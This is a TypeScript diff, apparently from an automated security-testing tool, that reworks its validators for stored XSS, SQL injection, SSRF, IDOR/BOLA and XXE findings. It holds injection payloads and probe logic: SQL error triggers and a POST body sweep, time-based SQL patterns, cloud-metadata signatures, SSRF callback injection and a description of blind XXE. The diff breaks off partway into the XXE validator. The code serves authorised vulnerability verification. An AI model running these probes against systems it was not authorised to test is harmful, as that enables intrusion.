@@ -90,6 +90,19 @@ export interface ValidatorConfig {
   authHeaders?: Record<string, string>;
   /** Auth cookies attached to every curl invocation the validator builds. */
   authCookies?: Cookie[];
+  /**
+   * Secondary identity for differential validators (idor/bola).
+   * When the active hunt has two auth sessions configured (victim + attacker),
+   * validators can re-run the probe as the secondary identity and compare.
+   * If the secondary identity's response contains the primary's data, that's
+   * definitionally a broken-access finding — regardless of status code.
+   */
+  secondaryAuthHeaders?: Record<string, string>;
+  secondaryAuthCookies?: Cookie[];
+  /** Human-readable label for the primary/secondary identities so the
+   *  validator can annotate evidence without guessing. */
+  primaryAuthLabel?: string;
+  secondaryAuthLabel?: string;
 }
 
 /**
@@ -353,38 +366,62 @@ registerValidator({
     const evidence: ValidationEvidence[] = [];
     const steps: string[] = [];
 
-    // For stored XSS, the target URL is where the payload *renders* (victim page)
-    // The marker should have been injected during the attack phase
     const marker = `HUNTRESS_XSS_${globalThis.crypto.randomUUID().slice(0, 8)}`;
     const renderUrl = finding.target;
+    const browser = await getSharedBrowser();
 
     steps.push(`Navigating to rendering page as victim: ${renderUrl}`);
     steps.push(`Checking for stored XSS marker: ${marker}`);
 
-    // Navigate to the rendering page in a clean (victim) context
-    const browser = await getSharedBrowser();
-    const result = await browser.validateStoredXSS(renderUrl, marker);
-
-    evidence.push(...result.evidence);
-
-    // Also check for any previously-injected payloads that trigger
-    // (the agent's original payload may still be live)
+    // Step 1: Plain navigation — does the agent's previously-injected payload
+    // still fire at the victim context? This is the primary stored-XSS signal.
     const browseResult = await browser.navigateAndAnalyze(renderUrl);
+    let confidence = 0;
+    let firingVariant: string | null = null;
+    let confirmed = false;
+
     if (browseResult.dialogDetected) {
+      confirmed = true;
+      confidence = 70;
+      firingVariant = 'agent-stored';
       evidence.push({
         type: 'script_output',
         description: `Stored XSS dialog triggered on page load: "${browseResult.dialogMessage ?? 'alert'}"`,
         data: `URL: ${renderUrl}\nDialog: ${browseResult.dialogMessage ?? 'unknown'}`,
         timestamp: Date.now(),
       });
-      result.confidence = Math.max(result.confidence, 50);
+      steps.push(`✓ Dialog fired on page load — agent's stored payload is still live`);
+    } else {
+      steps.push('No dialog on plain navigation — trying re-injection variants');
     }
 
-    const confidence = Math.min(100, result.confidence);
-    const confirmed = confidence >= 50;
+    // Step 2: If the stored payload didn't fire (agent context cleared,
+    // test fixtures reset between hunts, etc.), fall back to the reflected
+    // multi-payload sweep on the rendering URL. Many "stored" findings on
+    // SPAs are really reflected-via-hash — this catches both.
+    if (!confirmed) {
+      const variants = buildXssPayloadVariants(marker, 'alert');
+      for (const variant of variants) {
+        const craftedUrl = injectMarkerPayload(renderUrl, variant.html);
+        steps.push(`Trying ${variant.label} re-injection: ${variant.html}`);
 
-    steps.push(`Dialog on page load: ${browseResult.dialogDetected ? 'YES' : 'no'}`);
-    steps.push(`Confirmed: ${confirmed} (confidence: ${confidence}%)`);
+        const attempt = await browser.validateXSS(craftedUrl, marker);
+        evidence.push(...attempt.evidence);
+        confidence = Math.max(confidence, attempt.confidence);
+
+        if (attempt.confirmed) {
+          confirmed = true;
+          firingVariant = variant.label;
+          steps.push(`✓ CONFIRMED via ${variant.label} re-injection`);
+          break;
+        }
+      }
+
+      if (!confirmed) steps.push('No variant fired — stored XSS not confirmed at victim context');
+    }
+
+    confidence = Math.min(100, confidence);
+    steps.push(`Confirmed: ${confirmed} (confidence: ${confidence}%, firing variant: ${firingVariant ?? 'none'})`);
 
     return {
       findingId: finding.id,
@@ -489,6 +526,36 @@ registerValidator({
 
 // ─── SQLi Validators ─────────────────────────────────────────────────────────
 
+/** DB-engine error fingerprints shared by the SQLi validators. */
+const SQL_DB_ERRORS: Record<string, RegExp[]> = {
+  mysql: [/SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySQLSyntaxErrorException/i, /You have an error in your SQL syntax/i],
+  postgresql: [/ERROR:\s+syntax error/i, /pg_query/i, /PSQLException/i, /PostgreSQL.*ERROR/i],
+  mssql: [/Microsoft.*ODBC/i, /SQLServer/i, /Unclosed quotation mark/i, /SQL Server.*\[SQL/i],
+  oracle: [/ORA-\d{5}/i, /Oracle.*Driver/i, /quoted string not properly terminated/i],
+  sqlite: [/SQLITE_ERROR/i, /SQLite3::query/i, /near ".*": syntax error/i, /unrecognized token/i],
+};
+
+const SQL_ALL_ERROR_PATTERNS = Object.values(SQL_DB_ERRORS).flat();
+
+/** Canonical SQL error-trigger payload tried in POST body sweeps. A bare
+ *  single quote is the most portable trigger — breaks the string context in
+ *  every engine that would be vulnerable. */
+const SQL_ERROR_TRIGGERS = ["'", '")', "'))", "' OR '1'='1"];
+
+/** Body field names tried for POST SQLi sweeps. Separate list from SSTI's —
+ *  SQL injection tends to live in id/search/filter/sort/user fields. */
+const SQLI_BODY_FIELDS = [
+  'id', 'user_id', 'username', 'email', 'search', 'q', 'query',
+  'filter', 'sort', 'order', 'name',
+] as const;
+
+function detectSqlError(stdout: string): string | null {
+  for (const [db, patterns] of Object.entries(SQL_DB_ERRORS)) {
+    if (patterns.some(p => p.test(stdout))) return db;
+  }
+  return null;
+}
+
 registerValidator({
   vulnType: 'sqli_error',
   async validate(finding, config): Promise<ValidationResult> {
@@ -496,56 +563,111 @@ registerValidator({
     const evidence: ValidationEvidence[] = [];
     const steps: string[] = [];
 
-    // Step 1: Send the original error-triggering payload
-    const result = await config.executeCommand(
+    let confirmed = false;
+    let detectedDb: string | null = null;
+    let injectionSite: string | null = null;
+    let confidence = finding.confidence;
+
+    // Step 1: Re-send the original error-triggering URL (GET query path).
+    const originalResult = await config.executeCommand(
       buildCurlArgv({ url: finding.target, authHeaders: config.authHeaders, authCookies: config.authCookies }),
       finding.target
     );
 
-    // Check for database error strings
-    const dbErrors: Record<string, RegExp[]> = {
-      mysql: [/SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySQLSyntaxErrorException/i],
-      postgresql: [/ERROR:\s+syntax error/i, /pg_query/i, /PSQLException/i],
-      mssql: [/Microsoft.*ODBC/i, /SQLServer/i, /Unclosed quotation mark/i],
-      oracle: [/ORA-\d{5}/i, /Oracle.*Driver/i, /quoted string not properly terminated/i],
-      sqlite: [/SQLITE_ERROR/i, /SQLite3::query/i, /near ".*": syntax error/i],
-    };
-
-    let detectedDb: string | null = null;
-    for (const [db, patterns] of Object.entries(dbErrors)) {
-      for (const pattern of patterns) {
-        if (pattern.test(result.stdout)) {
-          detectedDb = db;
-          break;
-        }
-      }
-      if (detectedDb) break;
-    }
+    detectedDb = detectSqlError(originalResult.stdout);
 
     evidence.push({
       type: 'http_response',
       description: `Response with ${detectedDb ? detectedDb + ' error' : 'potential error'}`,
-      data: result.stdout.substring(0, 5000),
+      data: originalResult.stdout.substring(0, 5000),
       timestamp: Date.now(),
     });
 
     steps.push(`Sent error-triggering payload to: ${finding.target}`);
-    steps.push(`Database error detected: ${detectedDb || 'none'}`);
+    steps.push(`Database error detected in GET response: ${detectedDb || 'none'}`);
 
-    // Step 2: Send a clean request for comparison
+    // Step 2: Clean-URL negative control — if a stripped version of the
+    // original URL ALSO produces a DB error, the error is page-default and
+    // not caused by our payload. Discard.
     const cleanUrl = finding.target.replace(/['"\\].*$/, '');
-    const cleanResult = await config.executeCommand(
-      buildCurlArgv({ url: cleanUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
-      finding.target
-    );
+    if (cleanUrl !== finding.target) {
+      const cleanResult = await config.executeCommand(
+        buildCurlArgv({ url: cleanUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
+        finding.target
+      );
+      const cleanErr = detectSqlError(cleanResult.stdout);
+      if (cleanErr && detectedDb) {
+        steps.push(`FALSE POSITIVE: clean URL also returns ${cleanErr} error — discarding GET match`);
+        detectedDb = null;
+      } else {
+        steps.push(`Clean URL does not return DB error (${detectedDb ? 'confirmed' : 'nothing to confirm'})`);
+      }
+    }
 
-    const hasErrorInClean = Object.values(dbErrors).flat().some(p => p.test(cleanResult.stdout));
-    steps.push(`Clean request also shows error: ${hasErrorInClean ? 'yes (false positive)' : 'no (confirmed)'}`);
+    if (detectedDb) {
+      confirmed = true;
+      injectionSite = 'GET query';
+      confidence = Math.min(100, confidence + 25);
+    }
 
-    const confirmed = detectedDb !== null && !hasErrorInClean;
-    let confidence = finding.confidence;
-    if (detectedDb) confidence = Math.min(100, confidence + 25);
-    if (hasErrorInClean) confidence = Math.max(0, confidence - 40);
+    // Step 3: POST body sweep for API-looking targets (same heuristic as
+    // SSTI). The 2026-04-23 hunt pattern: agent finds SQLi in a body param,
+    // but the finding target is the bare endpoint URL with no query string,
+    // so GET-only probes never trigger.
+    const looksLikeApi = /\/(api|rest|v\d+)\//i.test(finding.target)
+      || /POST|PUT|PATCH/i.test(finding.description ?? '')
+      || /body|field|parameter/i.test(finding.description ?? '');
+
+    if (!confirmed && looksLikeApi) {
+      steps.push(`--- POST body sweep over ${SQLI_BODY_FIELDS.length} fields × ${SQL_ERROR_TRIGGERS.length} triggers ---`);
+
+      outer:
+      for (const field of SQLI_BODY_FIELDS) {
+        for (const trigger of SQL_ERROR_TRIGGERS) {
+          const probeResult = await config.executeCommand(
+            buildCurlArgv({
+              url: finding.target, method: 'POST',
+              body: JSON.stringify({ [field]: trigger }),
+              contentType: 'application/json',
+              authHeaders: config.authHeaders, authCookies: config.authCookies,
+            }),
+            finding.target
+          );
+          const bodyErr = detectSqlError(probeResult.stdout);
+          if (!bodyErr) continue;
+
+          // Negative control: clean value shouldn't error.
+          const cleanProbeResult = await config.executeCommand(
+            buildCurlArgv({
+              url: finding.target, method: 'POST',
+              body: JSON.stringify({ [field]: 'clean' }),
+              contentType: 'application/json',
+              authHeaders: config.authHeaders, authCookies: config.authCookies,
+            }),
+            finding.target
+          );
+          if (detectSqlError(cleanProbeResult.stdout)) {
+            steps.push(`  FALSE POSITIVE: clean value on "${field}" also errors — skip`);
+            continue;
+          }
+
+          detectedDb = bodyErr;
+          injectionSite = `POST body field "${field}" trigger ${JSON.stringify(trigger)}`;
+          confirmed = true;
+          confidence = Math.min(100, confidence + 30);
+          evidence.push({
+            type: 'http_response',
+            description: `${injectionSite}: ${bodyErr} error observed`,
+            data: probeResult.stdout.substring(0, 5000),
+            timestamp: Date.now(),
+          });
+          steps.push(`  ✓ CONFIRMED: ${injectionSite} → ${bodyErr}`);
+          break outer;
+        }
+      }
+
+      if (!confirmed) steps.push('POST body sweep exhausted — no SQLi confirmed');
+    }
 
     return {
       findingId: finding.id,
@@ -553,11 +675,44 @@ registerValidator({
       evidence,
       reproductionSteps: steps,
       confidence,
-      validatorUsed: 'sqli_error',
+      validatorUsed: injectionSite
+        ? `sqli_error (${injectionSite}, ${detectedDb})`
+        : 'sqli_error',
       validationTime: Date.now() - startTime,
     };
   },
 });
+
+/** Strip known time-based SQL payload patterns from a URL so we can hit the
+ *  same endpoint without the SLEEP/BENCHMARK/pg_sleep/WAITFOR fragment.
+ *  Used by sqli_blind_time to derive a baseline URL distinct from the
+ *  payload URL — without this, the baseline and delay probes hit the same
+ *  URL and the timing diff is always zero (the shipping-day bug this
+ *  function was written to fix). */
+export function deriveSqlBaselineUrl(target: string): string {
+  let clean = target;
+  const payloadPatterns: RegExp[] = [
+    /SLEEP\s*\(\s*\d+\s*\)/gi,
+    /BENCHMARK\s*\([^)]*\)/gi,
+    /pg_sleep\s*\(\s*\d+\s*\)/gi,
+    /WAITFOR\s+DELAY[^&'"]*'[^']*'/gi,
+    /dbms_pipe\.receive_message\s*\([^)]*\)/gi,
+  ];
+  for (const p of payloadPatterns) clean = clean.replace(p, '1');
+  // URL-encoded variants.
+  clean = clean
+    .replace(/SLEEP%28\d+%29/gi, '1')
+    .replace(/pg_sleep%28\d+%29/gi, '1');
+  // If nothing changed, null out the last query-param value — that still
+  // hits the same endpoint but removes whatever payload is there.
+  if (clean === target) {
+    if (clean.includes('?') && clean.includes('=')) {
+      const lastEq = clean.lastIndexOf('=');
+      clean = clean.substring(0, lastEq + 1) + '1';
+    }
+  }
+  return clean;
+}
 
 registerValidator({
   vulnType: 'sqli_blind_time',
@@ -566,19 +721,25 @@ registerValidator({
     const evidence: ValidationEvidence[] = [];
     const steps: string[] = [];
 
-    // Step 1: Baseline timing
+    const baselineUrl = deriveSqlBaselineUrl(finding.target);
+    const baselineDiffers = baselineUrl !== finding.target;
+
+    if (!baselineDiffers) {
+      steps.push('WARN: could not derive a distinct baseline URL (no query parameter or payload pattern to strip) — timing test is unreliable');
+    }
+
+    // Step 1: Baseline timing — clean URL with no SQL payload.
     const baseline = await config.executeCommand(
       buildCurlArgv({
-        url: finding.target, discardBody: true, writeOut: '%{time_total}',
+        url: baselineUrl, discardBody: true, writeOut: '%{time_total}',
         authHeaders: config.authHeaders, authCookies: config.authCookies,
       }),
       finding.target
     );
     const baselineTime = parseFloat(baseline.stdout) * 1000;
+    steps.push(`Baseline (${baselineUrl}) response time: ${baselineTime.toFixed(0)}ms`);
 
-    steps.push(`Baseline response time: ${baselineTime.toFixed(0)}ms`);
-
-    // Step 2: Time-based payload (should cause delay)
+    // Step 2: Delay probe — the original payload URL.
     const delayResult = await config.executeCommand(
       buildCurlArgv({
         url: finding.target, discardBody: true, writeOut: '%{time_total}',
@@ -587,25 +748,35 @@ registerValidator({
       finding.target
     );
     const delayTime = parseFloat(delayResult.stdout) * 1000;
-
-    steps.push(`Delay payload response time: ${delayTime.toFixed(0)}ms`);
+    steps.push(`Delay payload (${finding.target}) response time: ${delayTime.toFixed(0)}ms`);
 
     evidence.push({
       type: 'timing',
       description: `Baseline: ${baselineTime.toFixed(0)}ms, With delay: ${delayTime.toFixed(0)}ms`,
-      data: `Difference: ${(delayTime - baselineTime).toFixed(0)}ms`,
+      data: `Baseline URL: ${baselineUrl}\nPayload URL: ${finding.target}\nDifference: ${(delayTime - baselineTime).toFixed(0)}ms`,
       timestamp: Date.now(),
     });
 
-    // Confirm if delay is significantly longer (at least 3 seconds difference)
+    // Without a distinct baseline the timing diff is meaningless — don't
+    // confirm on noise.
     const timeDiff = delayTime - baselineTime;
-    const confirmed = timeDiff > 3000;
+    let confirmed = false;
     let confidence = finding.confidence;
-    if (timeDiff > 5000) confidence = Math.min(100, confidence + 30);
-    else if (timeDiff > 3000) confidence = Math.min(100, confidence + 15);
-    else confidence = Math.max(0, confidence - 20);
 
-    steps.push(`Time difference: ${timeDiff.toFixed(0)}ms (threshold: 3000ms)`);
+    if (!baselineDiffers) {
+      confidence = Math.max(0, confidence - 30);
+      steps.push('Not confirmed: no baseline URL to compare against');
+    } else if (timeDiff > 5000) {
+      confirmed = true;
+      confidence = Math.min(100, confidence + 30);
+    } else if (timeDiff > 3000) {
+      confirmed = true;
+      confidence = Math.min(100, confidence + 15);
+    } else {
+      confidence = Math.max(0, confidence - 20);
+    }
+
+    steps.push(`Time difference: ${timeDiff.toFixed(0)}ms (threshold: 3000ms, confirmed: ${confirmed})`);
 
     return {
       findingId: finding.id,
@@ -619,7 +790,33 @@ registerValidator({
   },
 });
 
-// ─── SSRF Validator (double-confirm: response content + OOB callback) ───────
+/** Substitute a URL into the target's query-parameter value slot. Preserves
+ *  the same host/path so the vulnerability condition stays triggered; only
+ *  the value-part (what the server-side fetcher will try to retrieve) gets
+ *  replaced with our fresh OOB URL. */
+function substituteUrlValue(target: string, replacementUrl: string): string {
+  if (target.includes('?') && target.includes('=')) {
+    const lastEq = target.lastIndexOf('=');
+    return target.substring(0, lastEq + 1) + encodeURIComponent(replacementUrl);
+  }
+  // No query param to substitute into — append one for the fetcher.
+  return `${target}${target.includes('?') ? '&' : '?'}url=${encodeURIComponent(replacementUrl)}`;
+}
+
+/** Sleep for `ms` milliseconds. Used while waiting for async OOB callbacks
+ *  after sending a probe. */
+function sleep(ms: number): Promise<void> {
+  return new Promise(r => setTimeout(r, ms));
+}
+
+// ─── SSRF Validator ─────────────────────────────────────────────────────────
+// Three confirmation paths, any of which stands on its own:
+//   1. Cloud-metadata indicators in the response body (AWS, GCP, localhost refs).
+//   2. Active OOB callback — we inject a freshly-allocated interactsh URL
+//      into the target, send the probe, and wait for the server-side fetch
+//      to hit our OOB host. This is the strongest possible proof.
+//   3. Passive OOB correlation — fall back to any callback the agent's
+//      exploration phase already triggered against this target.
 
 registerValidator({
   vulnType: 'ssrf',
@@ -628,75 +825,112 @@ registerValidator({
     const evidence: ValidationEvidence[] = [];
     const steps: string[] = [];
 
-    let responseConfirmed = false;
-    let oobConfirmed = false;
-
-    // Step 1: Send request and check for internal data in response
+    // Step 1: Cloud-metadata indicator scan on the agent's original target.
     const result = await config.executeCommand(
       buildCurlArgv({ url: finding.target, authHeaders: config.authHeaders, authCookies: config.authCookies }),
       finding.target
     );
 
-    // Check for cloud metadata indicators
     const metadataIndicators = [
-      /ami-[a-f0-9]+/i,           // AWS AMI ID
-      /iam.*role/i,                // AWS IAM
-      /instance-id/i,              // AWS instance
-      /access.?key/i,              // Access keys
-      /secret.?key/i,              // Secret keys
-      /127\.0\.0\.1/,              // Localhost
-      /169\.254\.169\.254/,        // AWS metadata
-      /metadata\.google/,          // GCP metadata
-      /computeMetadata/,           // GCP metadata v1
-      /latest\/meta-data/,         // AWS metadata path
+      /ami-[a-f0-9]+/i,
+      /iam.*role/i,
+      /instance-id/i,
+      /access.?key/i,
+      /secret.?key/i,
+      /127\.0\.0\.1/,
+      /169\.254\.169\.254/,
+      /metadata\.google/,
+      /computeMetadata/,
+      /latest\/meta-data/,
     ];
-
     const matchedIndicators = metadataIndicators.filter(p => p.test(result.stdout));
 
     evidence.push({
       type: 'http_response',
-      description: 'Response from SSRF payload',
+      description: 'Response from SSRF probe',
       data: result.stdout.substring(0, 5000),
       timestamp: Date.now(),
     });
 
-    responseConfirmed = matchedIndicators.length >= 2;
-    steps.push(`Sent SSRF payload to: ${finding.target}`);
-    steps.push(`Internal data indicators found: ${matchedIndicators.length}`);
+    const responseConfirmed = matchedIndicators.length >= 2;
+    steps.push(`Sent SSRF probe to: ${finding.target}`);
+    steps.push(`Cloud-metadata indicators matched: ${matchedIndicators.length}`);
 
-    // Step 2: Check OOB server for callback confirmation
+    // Step 2: Active OOB injection. Allocate a fresh callback URL, jam it
+    // into the target's URL-param slot, send the probe, and wait ~3s for
+    // the server-side fetch to land on our OOB host. The callback id makes
+    // this deterministic: no false-positives from the agent's prior probes.
+    let activeOobConfirmed = false;
     if (validatorOobServer) {
-      const triggeredCallbacks = validatorOobServer.getTriggeredCallbacks().filter(c =>
-        c.injectionPoint.vulnerabilityType === 'ssrf' &&
-        c.injectionPoint.target === finding.target
+      const callback = validatorOobServer.generateCallbackUrl({
+        vulnerabilityType: 'ssrf',
+        target: finding.target,
+        parameter: 'url',
+        agentId: finding.agentId ?? 'validator',
+      });
+      const oobUrl = validatorOobServer.getHttpUrl(callback);
+      const probeUrl = substituteUrlValue(finding.target, oobUrl);
+
+      steps.push(`Active OOB probe → ${probeUrl}`);
+      await config.executeCommand(
+        buildCurlArgv({ url: probeUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
+        finding.target
       );
 
-      oobConfirmed = triggeredCallbacks.length > 0;
+      // Server-side fetch may race our await — give the OOB poller ~3s.
+      await sleep(3000);
 
-      if (oobConfirmed) {
-        const cb = triggeredCallbacks[0];
+      if (validatorOobServer.isTriggered(callback.id)) {
+        activeOobConfirmed = true;
+        const cb = validatorOobServer.getTriggeredCallbacks().find(c => c.id === callback.id);
         evidence.push({
           type: 'callback',
-          description: `OOB callback received: ${cb.interaction?.protocol ?? 'unknown'} from ${cb.interaction?.sourceIp ?? 'unknown'}`,
-          data: `Callback ID: ${cb.id}\nTriggered at: ${new Date(cb.triggeredAt ?? 0).toISOString()}\nRaw: ${cb.interaction?.rawData?.substring(0, 500) ?? 'none'}`,
+          description: `Active OOB callback received from ${cb?.interaction?.sourceIp ?? 'unknown'} (${cb?.interaction?.protocol ?? 'unknown'})`,
+          data: `Callback ID: ${callback.id}\nOOB URL: ${oobUrl}\nTriggered at: ${new Date(cb?.triggeredAt ?? 0).toISOString()}`,
           timestamp: Date.now(),
         });
-        steps.push(`OOB callback confirmed: ${cb.interaction?.protocol} from ${cb.interaction?.sourceIp}`);
+        steps.push(`✓ Active OOB CONFIRMED — server-side fetch hit our OOB host`);
       } else {
-        steps.push('OOB callback: not triggered');
+        steps.push('Active OOB: no callback within 3s window');
       }
     } else {
-      steps.push('OOB server not available — skipping callback check');
+      steps.push('OOB server not available — active injection skipped');
     }
 
-    // Double-confirm: need BOTH response content AND OOB, or strong response evidence
-    const confirmed = (responseConfirmed && oobConfirmed) || matchedIndicators.length >= 4;
+    // Step 3: Passive OOB correlation — fall back to any callback from the
+    // agent's exploration phase that matches this target.
+    let passiveOobConfirmed = false;
+    if (!activeOobConfirmed && validatorOobServer) {
+      const priorCallbacks = validatorOobServer.getTriggeredCallbacks().filter(c =>
+        c.injectionPoint.vulnerabilityType === 'ssrf'
+        && c.injectionPoint.target === finding.target
+      );
+      if (priorCallbacks.length > 0) {
+        passiveOobConfirmed = true;
+        const cb = priorCallbacks[0];
+        evidence.push({
+          type: 'callback',
+          description: `Passive OOB callback from agent phase: ${cb.interaction?.protocol ?? 'unknown'} from ${cb.interaction?.sourceIp ?? 'unknown'}`,
+          data: `Callback ID: ${cb.id}\nTriggered at: ${new Date(cb.triggeredAt ?? 0).toISOString()}`,
+          timestamp: Date.now(),
+        });
+        steps.push(`Passive OOB callback from agent phase — confirmed`);
+      } else {
+        steps.push('Passive OOB: no prior callbacks on this target');
+      }
+    }
+
+    const oobConfirmed = activeOobConfirmed || passiveOobConfirmed;
+    const confirmed = oobConfirmed
+      || (responseConfirmed && matchedIndicators.length >= 4);
+
     let confidence = finding.confidence;
     if (responseConfirmed) confidence = Math.min(100, confidence + 20);
-    if (oobConfirmed) confidence = Math.min(100, confidence + 30);
+    if (activeOobConfirmed) confidence = Math.min(100, confidence + 40);
+    else if (passiveOobConfirmed) confidence = Math.min(100, confidence + 30);
     if (responseConfirmed && oobConfirmed) confidence = Math.min(100, confidence + 10);
 
-    steps.push(`Double-confirm: response=${responseConfirmed}, oob=${oobConfirmed}`);
+    steps.push(`Confirmation: response=${responseConfirmed}, active_oob=${activeOobConfirmed}, passive_oob=${passiveOobConfirmed}`);
 
     return {
       findingId: finding.id,
@@ -704,7 +938,11 @@ registerValidator({
       evidence,
       reproductionSteps: steps,
       confidence,
-      validatorUsed: 'ssrf_double_confirm',
+      validatorUsed: activeOobConfirmed
+        ? 'ssrf_active_oob'
+        : passiveOobConfirmed
+          ? 'ssrf_passive_oob'
+          : 'ssrf_response_indicators',
       validationTime: Date.now() - startTime,
     };
   },
@@ -712,51 +950,136 @@ registerValidator({
 
 // ─── IDOR Validator ──────────────────────────────────────────────────────────
 
-registerValidator({
-  vulnType: 'idor',
-  async validate(finding, config): Promise<ValidationResult> {
-    const startTime = Date.now();
-    const evidence: ValidationEvidence[] = [];
-    const steps: string[] = [];
+/** Validator logic shared by idor and bola — a broken-access check that
+ *  re-sends the finding's target as the primary identity (status-code check)
+ *  and, when a secondary identity is configured, as the attacker identity
+ *  for a data-ownership differential. Same-body-different-identity is the
+ *  gold-standard broken-access signal. */
+async function validateBrokenAccess(
+  finding: ReactFinding,
+  config: ValidatorConfig,
+  validatorLabel: 'idor' | 'bola',
+): Promise<ValidationResult> {
+  const startTime = Date.now();
+  const evidence: ValidationEvidence[] = [];
+  const steps: string[] = [];
 
-    // Step 1: Make the original request
-    const result1 = await config.executeCommand(
+  // Step 1: Primary identity — the agent's original request.
+  const result1 = await config.executeCommand(
+    buildCurlArgv({
+      url: finding.target, dumpHeaders: true,
+      authHeaders: config.authHeaders, authCookies: config.authCookies,
+    }),
+    finding.target
+  );
+  evidence.push({
+    type: 'http_response',
+    description: `Response as ${config.primaryAuthLabel ?? 'primary'} identity`,
+    data: result1.stdout.substring(0, 5000),
+    timestamp: Date.now(),
+  });
+
+  const statusMatch = result1.stdout.match(/HTTP\/[\d.]+ (\d{3})/);
+  const primaryStatus = statusMatch ? parseInt(statusMatch[1], 10) : 0;
+  steps.push(`Primary identity (${config.primaryAuthLabel ?? '?'}) → HTTP ${primaryStatus}`);
+
+  let confirmed = false;
+  let confidence = finding.confidence;
+
+  // Status-code gate (same as before — needed for the no-second-identity case).
+  const statusOnlyConfirmed = primaryStatus === 200 && result1.stdout.length > 200;
+  if (statusOnlyConfirmed) {
+    confirmed = true;
+    confidence = Math.min(100, confidence + 15);
+  }
+  if (primaryStatus === 401 || primaryStatus === 403) {
+    confidence = Math.max(0, confidence - 40);
+  }
+
+  // Step 2: Secondary-identity differential (only when available).
+  let differentialConfirmed = false;
+  if (config.secondaryAuthHeaders || config.secondaryAuthCookies) {
+    const result2 = await config.executeCommand(
       buildCurlArgv({
         url: finding.target, dumpHeaders: true,
-        authHeaders: config.authHeaders, authCookies: config.authCookies,
+        authHeaders: config.secondaryAuthHeaders, authCookies: config.secondaryAuthCookies,
       }),
       finding.target
     );
-
     evidence.push({
       type: 'http_response',
-      description: 'Response with manipulated ID',
-      data: result1.stdout.substring(0, 5000),
+      description: `Response as ${config.secondaryAuthLabel ?? 'secondary'} identity`,
+      data: result2.stdout.substring(0, 5000),
       timestamp: Date.now(),
     });
+    const secStatusMatch = result2.stdout.match(/HTTP\/[\d.]+ (\d{3})/);
+    const secondaryStatus = secStatusMatch ? parseInt(secStatusMatch[1], 10) : 0;
+    steps.push(`Secondary identity (${config.secondaryAuthLabel ?? '?'}) → HTTP ${secondaryStatus}`);
 
-    // Check for 200 OK with data (not 401/403)
-    const statusMatch = result1.stdout.match(/HTTP\/[\d.]+ (\d{3})/);
-    const statusCode = statusMatch ? parseInt(statusMatch[1], 10) : 0;
+    // Strip HTTP headers from both bodies for a body-only compare.
+    const primaryBody = result1.stdout.replace(/^[\s\S]*?\r?\n\r?\n/, '');
+    const secondaryBody = result2.stdout.replace(/^[\s\S]*?\r?\n\r?\n/, '');
 
-    steps.push(`Request with manipulated ID returned status: ${statusCode}`);
+    // Same-body-different-identity = confirmed broken access. The secondary
+    // identity shouldn't see the primary's data; the fact that it does
+    // proves ownership isn't checked. Length threshold guards against
+    // "identical empty response" false matches (e.g. both hitting a blank
+    // 404 page) without making the check too strict to flag short JSON.
+    const IDENTICAL_BODY_MIN_BYTES = 10;
+    if (
+      secondaryStatus === 200
+      && secondaryBody.length > IDENTICAL_BODY_MIN_BYTES
+      && primaryBody.length > IDENTICAL_BODY_MIN_BYTES
+      && primaryBody === secondaryBody
+    ) {
+      differentialConfirmed = true;
+      confirmed = true;
+      confidence = Math.min(100, confidence + 40);
+      steps.push(`✓ DIFFERENTIAL CONFIRMED: secondary identity sees identical response body (${secondaryBody.length} bytes) — broken access`);
+      evidence.push({
+        type: 'diff',
+        description: 'Primary and secondary identities returned identical bodies',
+        data: `Primary body length: ${primaryBody.length}\nSecondary body length: ${secondaryBody.length}\nIdentical: YES`,
+        timestamp: Date.now(),
+      });
+    } else if (secondaryStatus === 200 && secondaryBody.length > IDENTICAL_BODY_MIN_BYTES) {
+      // Secondary got a 200 but different content — still suggestive; the
+      // resource is accessible but content may be per-identity. Partial hit.
+      confidence = Math.min(100, confidence + 20);
+      steps.push(`Partial signal: secondary returns 200 with ${secondaryBody.length} bytes — data may be per-identity`);
+    } else {
+      steps.push(`Secondary identity access denied (HTTP ${secondaryStatus}) — primary's 200 may be legitimate ownership`);
+      // If we had only status-only confirmation, downgrade — the second
+      // identity can't see the data, which suggests ownership *is* checked.
+      if (statusOnlyConfirmed && !differentialConfirmed) {
+        confirmed = false;
+        confidence = Math.max(0, confidence - 15);
+      }
+    }
+  } else {
+    steps.push('No secondary identity configured — differential check skipped');
+  }
 
-    const confirmed = statusCode === 200 && result1.stdout.length > 200;
-    let confidence = finding.confidence;
-    if (statusCode === 200) confidence = Math.min(100, confidence + 15);
-    if (statusCode === 401 || statusCode === 403) confidence = Math.max(0, confidence - 40);
+  return {
+    findingId: finding.id,
+    confirmed,
+    evidence,
+    reproductionSteps: steps,
+    confidence,
+    validatorUsed: differentialConfirmed
+      ? `${validatorLabel}_differential`
+      : validatorLabel,
+    validationTime: Date.now() - startTime,
+  };
+}
 
-    return {
-      findingId: finding.id,
-      confirmed,
-      evidence,
-      reproductionSteps: steps,
-      confidence,
-      validatorUsed: 'idor',
-      validationTime: Date.now() - startTime,
-    };
+registerValidator({
+  vulnType: 'idor',
+  async validate(finding, config): Promise<ValidationResult> {
+    return validateBrokenAccess(finding, config, 'idor');
   },
 });
+
 
 // ─── Open Redirect Validator ─────────────────────────────────────────────────
 
@@ -818,6 +1141,17 @@ registerValidator({
 
 // ─── XXE Validator ──────────────────────────────────────────────────────────
 
+// ─── XXE Validator ──────────────────────────────────────────────────────────
+// Two confirmation paths:
+//   1. Direct-echo XXE — replay the agent's original request and look for
+//      /etc/passwd / win.ini / os-release / web.xml fingerprints in the
+//      response body.
+//   2. Blind XXE — synthesize a real XXE payload that references an OOB
+//      DTD URL, POST it to the target as XML, and wait for the XML parser
+//      to fetch our OOB host. This is the classic blind-XXE proof
+//      (external parameter entity fetching a remote DTD) and works even
+//      when the response body never echoes file content.
+
 registerValidator({
   vulnType: 'xxe',
   async validate(finding, config): Promise<ValidationResult> {
@@ -825,13 +1159,12 @@ registerValidator({
     const evidence: ValidationEvidence[] = [];
     const steps: string[] = [];
 
-    // Send the XXE payload and check for file content in response
+    // Step 1: Direct echo — replay the agent's original request.
     const result = await config.executeCommand(
       buildCurlArgv({ url: finding.target, authHeaders: config.authHeaders, authCookies: config.authCookies }),
       finding.target
     );
 
-    // Check for /etc/passwd content
     const passwdIndicators = [
       /root:x?:0:0:/,
       /daemon:x?:\d+:\d+:/,
@@ -840,33 +1173,88 @@ registerValidator({
       /bin\/sh/,
